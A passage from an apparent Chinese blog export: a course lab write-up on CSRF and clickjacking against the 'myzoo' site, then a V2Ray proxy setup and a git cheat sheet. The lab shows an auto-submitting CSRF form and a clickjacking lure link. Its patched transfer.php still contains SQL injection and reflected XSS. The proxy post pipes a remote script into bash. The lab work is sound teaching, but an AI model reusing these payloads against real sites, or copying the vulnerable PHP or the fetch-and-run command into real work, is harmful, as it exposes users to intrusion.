class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transferform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>myzoo网站修改transfer.php</p>
<p>Transfer.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;includes/common.php&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">nav_start_outer</span>(<span class="string">&quot;Transfer&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">nav_start_inner</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// if($_POST[&#x27;submission&#x27;]) &#123;</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123; </span><br><span class="line"> <span class="comment">//  if($_POST[&#x27;submission&#x27;] &amp;&amp; $_SERVER[&#x27;HTTP_REFERER&#x27;] == &quot;http://www.myzoo.com/transfer.php&quot;) &#123;</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">	 <span class="variable">$recipient</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;recipient&#x27;</span>];</span><br><span class="line">    <span class="variable">$zoobars</span> = (<span class="keyword">int</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;zoobars&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$sender_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] - <span class="variable">$zoobars</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT PersonID FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$recipient_exists</span> = <span class="variable">$rs</span>[<span class="string">&quot;PersonID&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$zoobars</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$sender_balance</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="variable">$recipient_exists</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$sender_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">      <span class="variable">$recipient_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] + <span class="variable">$zoobars</span>;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$recipient_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&quot;Sent <span class="subst">$zoobars</span> zoobars&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$result</span> = <span class="string">&quot;Transfer to <span class="subst">$recipient</span> failed.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;myZoobars&quot;</span>&gt;  <span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">  <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">  <span class="variable">$balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$balance</span> &gt; <span class="number">0</span> ? <span class="variable">$balance</span> : <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span> &lt;/span&gt; zoobars&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123;</span><br><span class="line">     <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=POST name=transferform</span><br><span class="line">  action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Send &lt;input name=zoobars type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;zoobars&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span> size=<span class="number">5</span>&gt; zoobars&lt;/p&gt;</span><br><span class="line">&lt;p&gt;to &lt;input name=recipient type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;recipient&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submission value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;span <span class="class"><span class="keyword">class</span>=<span class="title">warning</span>&gt;&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">echo</span> &quot;$<span class="title">result</span>&quot;; </span></span><br><span class="line"><span class="class">?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">nav_end_inner</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot; <span class="title">src</span>=&quot;<span class="title">zoobars</span>.<span class="title">js</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">  <span class="title">nav_end_outer</span>(); </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h3><p>1.修改clickjacking的profile</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.attack.com/clickjacking.html&quot;</span>&gt;</span>点击赢大奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.当用户victim去查看clickjacking的profile时，并点击链接，会出现如下网页（只要将clickjacking.html中opacity设置为0，原页面就完全看不到）</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234359.png" alt="截屏2021-01-08 下午8.39.16"></p>
<p>因为第一次提交的表单没有token字段，所以csrf攻击不成功，但是此时已经将表单填好了，只要用户点击win，就会向clickjacking转1个zoobars。</p>
<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><h4 id="方法一-X-FRAME-OPTIONS"><a href="#方法一-X-FRAME-OPTIONS" class="headerlink" title="方法一:X-FRAME-OPTIONS"></a>方法一:X-FRAME-OPTIONS</h4><p>1.配置 Apache 在所有页面上发送 X-Frame-Options 响应头</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apache2/sites-available/000-default.conf</span><br></pre></td></tr></table></figure>

<p>在里面加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Header always append X-Frame-Options DENY</span><br></pre></td></tr></table></figure>

<p>重启apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2enmod headers</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>信息安全实践</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建梯子</title>
    <url>/2022/01/14/%E6%90%AD%E5%BB%BA%E6%A2%AF%E5%AD%90/</url>
    <content><![CDATA[<h1 id="搭建梯子"><a href="#搭建梯子" class="headerlink" title="搭建梯子"></a>搭建梯子</h1><p><code>v2ray info</code> 查看 V2Ray 配置信息<br><code>v2ray config</code> 修改 V2Ray 配置<br><code>v2ray link</code> 生成 V2Ray 配置文件链接<br><code>v2ray infolink</code> 生成 V2Ray 配置信息链接<br><code>v2ray qr</code> 生成 V2Ray 配置二维码链接<br><code>v2ray ss</code> 修改 Shadowsocks 配置<br><code>v2ray ssinfo</code> 查看 Shadowsocks 配置信息<br><code>v2ray ssqr</code> 生成 Shadowsocks 配置二维码链接<br><code>v2ray status</code> 查看 V2Ray 运行状态<br><code>v2ray start</code> 启动 V2Ray<br><code>v2ray stop</code> 停止 V2Ray<br><code>v2ray restart</code> 重启 V2Ray<br><code>v2ray log</code> 查看 V2Ray 运行日志<br><code>v2ray update</code> 更新 V2Ray<br><code>v2ray update.sh</code> 更新 V2Ray 管理脚本<br><code>v2ray uninstall</code> 卸载 V2Ray</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">买服务器</span></span><br><span class="line"></span><br><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手机安装 shadowracket</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">电脑安装 clashX</span></span><br><span class="line">添加一下配置文件</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>chaos</category>
      </categories>
      <tags>
        <tag>chaos</tag>
      </tags>
  </entry>
  <entry>
    <title>常用命令</title>
    <url>/2021/12/21/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><p><a href="https://learngitbranching.js.org/?locale=zh_CN">Git学习网站</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将本地项目推送到github</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;init commit&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将本地项目与远程仓库关联</span></span><br><span class="line">git remote add origin https://github.com/HuangMingwang/test.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次提交需要-u，该-u标志添加了对您推送到的上游服务器的跟踪引用。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一旦你做了一个git push -u origin master，你可以稍后调用git pull，git 就会知道你实际上是指git pull origin master.</span></span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看远程仓库地址</span></span><br><span class="line">git remote -v</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http 与ssh互转</span></span><br><span class="line">git remote set-url origin https://xxxxxxx.git</span><br><span class="line">git remote set-url origin git@git.xxxxx.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个新的版本库</span></span><br><span class="line">git clone https://git.woa.com/mingwhuang/mybatisplus-demo.git</span><br><span class="line">cd mybatisplus-demo</span><br><span class="line">touch README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;add README&quot;</span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换分支</span></span><br><span class="line">git checkout -b test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看历史</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用merge合并</span></span><br><span class="line">git merge test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用rebase合并</span></span><br><span class="line">git checkout test</span><br><span class="line">git merge test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打tag</span></span><br><span class="line">git tag v1.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看tag</span></span><br><span class="line">git tag</span><br><span class="line">git push origin v1.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回退暂存区的内容到上一个版本，已经add的会变成没有add的状态，工作区内容不变</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HEAD^ 上一个版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HEAD^^ 上上一个版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HEAD^^^ 上上上一个版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个命令仅改变暂存区，并不改变工作区，这意味着在无任何其他操作的情况下，工作区中的实际文件同该命令运行之前无任何变化</span></span><br><span class="line">git reset HEAD^  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回退hello.php 文件的版本到上一个版本</span>  </span><br><span class="line">git reset HEAD^ hello.php  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回退到指定版本</span></span><br><span class="line">git reset 052e(哈希值) </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">往前回退一个版本，并且将这次错误的提交的代码改动，放在工作区里。（和不带参数是一样的）</span></span><br><span class="line">git reset --mixed HEAD^</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作区：即自己当前分支所修改的代码，git add xx 之前的！不包括 git add xx 和 git commit xxx 之后的。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回到某个节点，回退完了后工作区就是上一个版本的代码了，并且是clean的，只会回退已经add到文件缓存区（暂存区）的内容（包括新增的文件）</span></span><br><span class="line">git reset --hard HASH</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">往前回退一个版本，并且将这次错误的提交的代码改动，放在暂存区里。</span></span><br><span class="line">git reset --soft HASH </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">撤销对所有已修改并且已经add到暂存区但未提交的文件的修改，但不包括新增的文件,新增的文件内容都不会变</span></span><br><span class="line">git checkout .</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">撤销对指定文件的修改，[filename]为文件名</span></span><br><span class="line">git checkout [filename] </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是一次clean的演习, 告诉你哪些文件会被删除. 记住他不会真正的删除文件, 只是一个提醒</span></span><br><span class="line">git clean -n</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除当前目录下所有没有track过的文件，不会删除新建的文件里面的文件，他不会删除.gitignore文件里面指定的文件夹和文件, 不管这些文件有没有被track过</span></span><br><span class="line">git clean -f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除指定路径下的没有被track过的文件,当前文件夹如果是新建的也一起会删除</span></span><br><span class="line">git clean -f &lt;path&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除当前目录下没有被track过的文件和文件夹，例如没有add到暂存区的文件和文件夹</span></span><br><span class="line">git clean -df</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除当前目录下所有没有track过的文件. 不管他是否是.gitignore文件里面指定的文件夹和文件</span></span><br><span class="line">git clean -xf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git reset --hard和git clean -f是一对好基友. 结合使用他们能让你的工作目录完全回退到最近一次commit的时候</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git clean对于刚编译过的项目也非常有用. 如, 他能轻易删除掉编译后生成的.o和.exe等文件. 这个在打包要发布一个release的时候非常有用</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面的例子要删除所有工作目录下面的修改, 包括新添加的文件. 假设你已经提交了一些快照了, 而且做了一些新的开发</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行后, 工作目录和缓存区回到最近一次commit时候一摸一样的状态，git status会告诉你这是一个干净的工作目录, 又是一个新的开始了！</span></span><br><span class="line">git reset --hard &amp;&amp; git clean -df</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除当前commit里的.idea文件夹</span></span><br><span class="line">git rm -rf .idea</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置git gc周期</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是一个被删除的提交会在删除30天后，且运行 git gc 以后，被永久丢弃</span></span><br><span class="line">git config gc.pruneexpire &quot;30 days&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在这种情况下提交将只在你手工运行 git gc 的情况下才永久删除。</span></span><br><span class="line">git config gc.auto 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找回丢失的commit</span></span><br><span class="line">git fsck --lost-found</span><br><span class="line">git show &lt;HASH&gt;</span><br><span class="line">git merge</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git squash用法</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先checkout master分支并做本地分支和远程仓库同步</span></span><br><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到开发分支，并执行commits合并操作</span></span><br><span class="line">git checkout feature/mingwhuang_123123</span><br><span class="line">git rebase -i master</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">中止abort</span></span><br><span class="line">git rebase --abort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主干开发，每次pull之前执行以下命令</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先checkout master分支并做本地分支和远程仓库同步</span></span><br><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到开发分支，并执行rebase操作</span></span><br><span class="line">git checkout &#123;分支名&#125;</span><br><span class="line">git rebase master</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后再将开发分支push到远程仓库</span></span><br><span class="line">git pull</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果rebase出现问题，可以使用这个命令中止rebase</span></span><br><span class="line">git rebase --abort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">commit规范</span></span><br><span class="line">feat：新功能（feature）</span><br><span class="line">fix：修补bug</span><br><span class="line">docs：文档（documentation）</span><br><span class="line">style： 格式（不影响代码运行的变动）</span><br><span class="line">refactor：重构（即不是新增功能，也不是修改bug的代码变动）</span><br><span class="line">test：增加测试</span><br><span class="line">chore：构建过程或辅助工具的变动</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Git全局设置</span></span><br><span class="line">git config --global user.name  &quot;mingwhuang&quot;</span><br><span class="line">git config --global user.email &quot;mingwhuang@tencent.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除指定的远程仓库</span></span><br><span class="line">git remote rm origin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">master分支不能drop commit, 本地分支上的commit也不能删除，但是直接删掉分支所有的commit都处于丢失的commit</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">master出现了分叉，怎么处理</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先新建分支再cherypick，然后再将原来的master改名，再将新分支push -f上去</span></span><br><span class="line">git cherry-pick 多个hash值</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用一次新的commit来回滚之前的commit，此次提交之前的commit都会被保留</span></span><br><span class="line">git revert</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">文件被修改了，但未执行git add操作(working tree内撤销)</span></span><br><span class="line">git checkout fileName</span><br><span class="line">git checkout .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同时对多个文件执行了git add操作，但本次只想提交其中一部分文件</span></span><br><span class="line">git add *</span><br><span class="line">git status</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">取消暂存</span></span><br><span class="line">git reset HEAD</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">文件执行了git add操作，但想撤销对其的修改（index内回滚）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">取消暂存</span></span><br><span class="line">git reset HEAD fileName</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">撤销修改</span></span><br><span class="line">git checkout fileName</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改的文件已被git commit，但想再次修改不再产生新的Commit</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改最后一次提交</span></span><br><span class="line">git add sample.txt</span><br><span class="line">git commit --amend -m&quot;说明&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">已在本地进行了多次git commit操作，现在想撤销到其中某次Commit</span></span><br><span class="line">git reset [--hard|soft|mixed|merge|keep] [commit|HEAD]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">情况一：撤销指定文件到指定版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看指定文件的历史版本</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回滚到指定commitID</span></span><br><span class="line">git checkout</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">情况二：删除最后一次远程提交</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式一：使用revert</span></span><br><span class="line">git revert HEAD</span><br><span class="line">git push origin master</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式二：使用reset</span></span><br><span class="line">git reset --hard HEAD^</span><br><span class="line">git push origin master -f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">二者区别：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">revert是放弃指定提交的修改，但是会生成一次新的提交，需要填写提交注释，以前的历史记录都在；</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">reset是指将HEAD指针指到指定提交，历史记录中不会出现放弃的提交记录。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">情况三：回滚某次提交</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到要回滚的commitID</span></span><br><span class="line">git log</span><br><span class="line">git revert commitID</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除某次提交</span></span><br><span class="line">git log --online -n5</span><br></pre></td></tr></table></figure>

<h2 id="卸载并安装新版git"><a href="#卸载并安装新版git" class="headerlink" title="卸载并安装新版git"></a>卸载并安装新版git</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载</span></span><br><span class="line">yum -y remove git</span><br><span class="line">which -a git</span><br><span class="line">cd /usr/bin</span><br><span class="line">sudo rm -rf git*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /usr/local</span><br><span class="line">wget https://github.com/git/git/archive/refs/tags/v2.32.0.tar.gz</span><br><span class="line">tar -zxvf v2.32.0.tar.gz </span><br><span class="line"></span><br><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker</span><br><span class="line">cd git-2.32.0/</span><br><span class="line">make prefix=/usr/local/git all</span><br><span class="line">make prefix=/usr/local/git install</span><br><span class="line">vi /etc/profile </span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/usr/bin/git/bin</span><br><span class="line">source /etc/profile</span><br><span class="line">git --version</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">http.h:6:23: 致命错误：curl/curl.h：没有那个文件或目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行即可解决</span></span><br><span class="line">yum -y install curl-devel</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">http-push.c:22:19: 致命错误：expat.h：没有那个文件或目录</span></span><br><span class="line">yum install -y  expat-devel</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



